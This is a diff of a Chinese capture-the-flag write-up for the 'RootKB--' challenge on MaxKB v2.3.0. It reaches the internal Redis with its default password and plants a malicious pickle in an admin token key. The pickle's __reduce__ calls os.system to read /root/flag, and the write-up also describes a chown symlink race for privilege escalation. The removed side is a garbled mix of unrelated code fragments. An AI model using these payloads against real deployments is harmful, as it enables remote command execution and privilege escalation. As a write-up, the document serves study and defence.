@@ -1,128 +1,67 @@
-# RootKB—
+# RootKB--
 
 ## 题目简述
 
-题目提供可执行 Python 的工具沙箱，沙箱侧 Redis 使用默认口令，Celery 与 Redis 之间的消息使用 pickle 且没有有效的 `find_class` 限制。解法是向 Redis 的 token 相关 key 写入恶意 pickle，让管理员会话触发反序列化并读取 flag。
+`RootKB--` 将环境回退到 MaxKB v2.3.0。后台仍允许创建并执行 Python 工具，而内部 PostgreSQL、Redis 等服务沿用镜像默认配置。Nu1L 的实际解法利用沙箱能够访问 Redis、Redis 使用默认口令，以及应用会对 token 缓存值执行不受限的 pickle 反序列化，最终让主应用进程执行命令读取 `/root/flag`。
+
+官方题解还给出了一条预期方向：工具代码先写入临时 Python 文件，再由高权限逻辑执行 `chown sandbox_user:root <file>`；`chown` 默认跟随符号链接，因此可以通过竞争条件改变任意目标文件的属主，再借 `/etc/passwd` 等文件完成提权。比赛解法没有依赖这条竞态。
 
 ## 解题过程
 
-### 关键观察
+### 进入内部 Redis
 
-题目提供可执行 Python 的工具沙箱，沙箱侧 Redis 使用默认口令，Celery 与 Redis 之间的消息使用 pickle 且没有有效的 `find_class` 限制。
+先在“创建工具”处执行最小探测。v2.3.0 的沙箱没有 v2.3.1 中的网络限制，可以访问同一部署内的 Redis；题目镜像保留了默认口令 `Password123@redis`。不要把 PDF 中的完整临时 token key 写死，应该先枚举并识别当前管理员会话对应的 key：
 
-### 求解步骤
-
-创建工具处有一个沙箱能执行 python 代码。
-沙箱连接 redis ，密码是默认的，Password123@redis
-celery 和 redis通信使用了 pickle，这里没有 find_class 限制。
-读取token 的 key：
-#include <stdio.h>
-
-__attribute__((constructor)) void abc(void) {
-    const char *src = "/root/flag";
-    const char *dst = "/opt/maxkb-app/apps/static/admin/assets/flag";
-        rename(src, dst)
-}
-import base64
-import os
-
-def fileWrite():
-    with open("/opt/maxkb-app/sandbox/sandbox.so", "wb") as f:
-        f.write(base64.b64decode("base64"))
-    os.popen("whoami")
-    return "success"
-import socket
-
-class RedisClient:
-    def __init__(self, host='localhost', port=6379):
-        self.host = host
-        self.port = port
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-写 pickle payload：
-
-    def connect(self):
-        """建立 TCP 连接"""
-        self.socket.connect((self.host, self.port))
-
-    def send_command(self, command):
-        self.socket.sendall((command + '\\r\\n').encode('utf-8'))
-        return self.parse_response()
-
-    def parse_response(self):
-        """解析 Redis 服务器的响应（基础实现）"""
-        response = self.socket.recv(4096).decode('utf-8')
-        return response
-
-    def close(self):
-        """关闭连接"""
-        self.socket.close()
-
-def exp():
-    client = RedisClient()
-    client.connect()
-
-    client.send_command("auth Password123@redis")
-
-    # 设置键值对
-    res = client.send_command("keys *")
-
-    # res = open('/etc/passwd', 'r').read()
-
-    return res
-
-result = exp
+```python
 import redis
-import base64
 
-def main():
-    # 1. 连接Redis并进行认证
-    try:
-        r = redis.Redis(
-            host='localhost',
-            port=6379,
-            password='Password123@redis', # 如果有ACL用户名，加上
-username='your_username'
-写入后带着 admin 的 cookie 刷新一下触发反序列化。
-读 flag：
-RCTF{old_vuln_deleted___new_vuln_says_hi!}
-            decode_responses=False  # 确保获取的是bytes，便于处理二进制数据
-        )
-        # 测试连接
-        r.ping()
-        print("✅ Redis连接成功!")
-    except Exception as e:
-        print(f"❌ 连接Redis时出现错误: {e}")
-        return
+r = redis.Redis(
+    host="localhost",
+    port=6379,
+    password="Password123@redis",
+    decode_responses=False,
+)
 
-    # 2. 准备并存储字节数据
-    try:
-        # 示例1: 直接存储字节数据
-        binary_data =
-base64.b64decode('gASVbgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxSX19pbXBvcnRfXygn
-b3MnKS5wb3BlbignY2F0IC9yb290L2ZsYWcgPiAvdG1wL2ZsYWcgJiYgY2htb2QgNzc3IC90bXAvZm
-xhZycpLnJlYWQoKZSFlFKULg==')
+keys = list(r.scan_iter(match="*TOKEN*"))
+result = b"\n".join(keys).decode(errors="replace")
+```
 
- r.set(':TOKEN:eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOiJmMGRkOGY3MS1lNGVlLTExZWUtOGM
-4NC1hOGExNTk1ODAxYWIiLCJlbWFpbCI6IiIsInR5cGUiOiJTWVNURU1fVVNFUiJ9:1vKY0u:xS22i
-8t2qsCFdGvIYZ5T565rDDS6rJXd-ppgf7nnsUA', binary_data)
-        print("✅ 字节数据已存储。")
+### 构造反序列化对象
 
-    except Exception as e:
-        print(f"❌ 存储数据时出现错误: {e}")
+目标 token 值由应用按 pickle 格式读取，反序列化路径没有限制可加载的全局对象。可利用 `__reduce__` 返回一个命令执行函数，把 flag 写到沙箱后续能够读取的位置：
 
-    # 4. 关闭连接 (可选，但推荐)
-    r.close()
-    print("连接已关闭。")
+```python
+import os
+import pickle
+import redis
 
-result = main
-def exp():
-    res = open('/tmp/flag', 'r').read()
-    return res
+class Payload:
+    def __reduce__(self):
+        command = "cat /root/flag > /tmp/flag && chmod 644 /tmp/flag"
+        return os.system, (command,)
 
-result = exp
+r = redis.Redis(
+    host="localhost",
+    port=6379,
+    password="Password123@redis",
+    decode_responses=False,
+)
+
+target_key = b"<上一步确认的管理员 TOKEN key>"
+r.set(target_key, pickle.dumps(Payload(), protocol=4))
+result = "payload written"
+```
+
+带着对应管理员 cookie 再访问会读取该 token 的页面，主应用反序列化缓存值并执行命令。最后重新运行一个普通工具读取 `/tmp/flag`，比赛环境验证得到 `RCTF{old_vuln_deleted___new_vuln_says_hi!}`。
+
+这条链的关键不是 Celery 本身，而是“低权限工具可达内部 Redis”与“高权限应用信任 Redis 中的 pickle 数据”两个边界同时失守。原 PDF 把 `RootKB` 的 `sandbox.so` 代码和本题 Redis 代码排版到相邻位置，不能把两条利用链混为一谈。
+
+### 预期竞态的机制
+
+在另一条路线中，攻击者要在“写临时脚本”和 `chown` 之间把文件替换为符号链接。GNU `chown` 默认解引用命令行参数指向的符号链接并修改其目标；若竞态命中，就能让沙箱用户取得敏感文件写权限。这个外部文档中的必要结论已写入正文，原始说明可见 [GNU coreutils 的 chown 文档](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)。
 
 ## 方法总结
 
-- 核心技巧：Redis/Celery pickle 反序列化利用。
-- 识别信号：默认 Redis 口令、Celery 队列对象落 Redis、pickle 没有类加载限制。
-- 复用要点：优先找能被目标会话读取的 key，再写入最小恶意 pickle 验证执行。
+- 核心技巧：从受限工具横向访问内部 Redis，再用恶意 pickle 污染高权限应用会读取的 token 缓存。
+- 识别信号：沙箱能访问内网服务、镜像保留默认凭据、缓存数据使用 pickle 且没有安全反序列化边界。
+- 复用要点：先用只读枚举确认真实 key 和消费方，再写最小 payload；同时检查高权限文件操作是否存在符号链接跟随和 TOCTOU 竞态。
